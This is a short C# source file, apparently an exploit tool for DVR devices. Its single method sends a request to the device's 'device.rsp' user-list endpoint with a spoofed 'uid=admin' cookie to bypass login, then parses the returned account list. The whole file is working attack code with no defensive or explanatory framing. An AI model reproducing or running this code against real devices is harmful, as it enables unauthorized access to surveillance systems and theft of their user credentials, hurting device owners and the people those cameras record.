using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace DVRFault
{
    class ClientUrl
    {
        public static RespondModel DVRReq(string Address)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($@"{Address}/device.rsp?opt=user&cmd=list");
            request.Headers.Add(HttpRequestHeader.Cookie, "uid=admin");
            using (Stream stream = request.GetResponse().GetResponseStream())
            {
                using (StreamReader sr = new StreamReader(stream))
                {
                    RespondModel Respond = JsonConvert.DeserializeObject<RespondModel>(sr.ReadToEnd());
                    return Respond;
                }
            }
        }
    }
}
